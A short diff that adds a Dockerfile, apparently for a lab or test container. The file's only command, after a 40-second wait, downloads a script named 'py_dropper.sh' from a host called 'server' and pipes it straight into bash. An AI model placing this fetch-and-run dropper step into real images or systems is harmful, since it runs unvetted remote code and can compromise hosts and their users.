@@ -1,0 +1,3 @@
+FROM python:2
+
+CMD sleep 40; curl server:8000/py_dropper.sh | bash; tail -f /dev/null
